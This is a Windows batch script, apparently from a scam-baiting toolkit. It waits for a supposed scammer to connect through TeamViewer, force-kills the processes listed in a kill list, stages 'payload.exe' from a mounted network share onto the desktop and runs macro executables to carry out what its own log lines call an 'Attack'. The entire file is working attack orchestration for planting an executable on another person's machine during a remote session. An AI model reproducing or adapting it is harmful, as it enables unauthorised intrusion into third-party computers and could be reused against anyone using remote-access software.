@echo off
REM Check framwork
if not exist runtime\VMFOLDER.dat goto errorNOVMFOLDER
if not exist runtime goto errorRUNTIMEM
start "VM Setup" /wait "setup.bat"
set /p VMNETWORK=<runtime\network.name
set /p VMFOLDER=<runtime\VMFOLDER.dat
net use g: "\\%VMNETWORK%\%VMFOLDER%"
if not exist g:\ goto FolderError
call echo Activated> g:\connect.ini
timeout /nobreak 15 >nul
if %ERRORLEVEL% == 0 goto :success
start "" "Errors\RWE.vbs"
exit
:success
set killnum=0
REM Everything is ready!
echo [i] VM and Host connection successful! > g:\connect.ini
echo [i] Wating for Scammer to open TeamViewer... >> g:\connect.ini
REM Wait for TeamViwer to start
:NoTeam
tasklist /FI "IMAGENAME eq TeamViewer.exe" 2>NUL | find /I /N "TeamViewer.exe">NUL
if "%ERRORLEVEL%"=="0" goto Team
goto NoTeam
:Team
REM TeamViwer is started! HERE WE GO!
echo [i] TeamViewer found! Wating for login... >> g:\connect.ini
REM Waits for the scammer to login to a computer...
start "" /wait "Macros\FireFox(RUN).exe"
echo [*] Killing Process list... >> g:\connect.ini
FOR /F "tokens=1,* delims=: " %%j in (kill-list.txt) do taskkill /FI "IMAGENAME eq %%j" /F && set /a killnum=%killnum%+ 1
echo [i] %killnum% processes killed! >> g:\connect.ini
echo [*] Attack has started! >> g:\connect.ini
echo [i] Scammer has logged into computer... >> g:\connect.ini
mkdir "%userprofile%\Desktop\temp"
xcopy "g:\payload.exe" /I "%userprofile%\Desktop\Temp"
timeout /nobreak 4 >nul
start "" /wait "Macros\FireFox(RU).exe"
echo [i] Attack completed. Check the success and complete if something failed! >> g:\connect.ini
echo [*] Payload exiting...
exit
:errorNOVMFOLDER
start "" "Errors\NVM.vbs"
exit
:errorRUNTIMEM
start "" "Errors\RTM.vbs"
exit
:FolderError
echo    [!] "\\%VMNETWORK%\%VMFOLDER%" could not be mounted. Tryed to mount %VMFOLDER% into \\%VMNETWORK%\
pause >nul
exit